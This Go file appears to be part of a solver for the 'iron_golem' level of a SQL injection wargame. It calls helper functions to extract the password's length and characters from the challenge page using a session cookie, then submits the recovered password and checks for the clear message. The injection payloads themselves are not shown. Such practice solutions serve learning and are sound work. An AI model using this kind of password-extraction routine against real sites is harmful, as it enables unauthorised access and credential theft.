package problem

import(
	"fmt"
	"strings"
	"strconv"
)

func Iron_golem(session string){
	file := "iron_golem_0803cf46da7bda62b328dbfc1d77fe15.php"
	
	length := find_len6(file, session)
	fmt.Println("Key length is "+ strconv.Itoa(length) + ".")

	pw_str := find_pw6(file,length, session)
	fmt.Println("pw is "+ pw_str + ".")
		
	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"IRON_GOLEM Clear!"){
		fmt.Println("IRON_GOLEM Clear!")
	}
}